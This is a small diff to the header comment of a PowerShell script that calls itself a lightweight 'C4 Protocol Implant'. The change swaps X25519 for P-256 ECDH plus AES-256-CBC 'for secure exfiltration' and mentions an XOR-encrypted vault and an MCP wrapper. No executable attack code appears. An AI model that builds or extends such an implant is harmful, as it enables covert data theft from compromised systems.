@@ -1,8 +1,8 @@
 <#
 .SYNOPSIS
-    Lightweight C4 Protocol Implant (X25519 Hardened).
+    Lightweight C4 Protocol Implant (P-256 Hardened).
     Uses direct dictionary lookups hidden in an XOR-encrypted Vault.
-    100% reliable. Modern X25519 Elliptic Curve Cryptography.
+    P-256 ECDH + AES-256-CBC for secure exfiltration.
 #>
 
 # Read parameters from global variables (set by MCP wrapper)
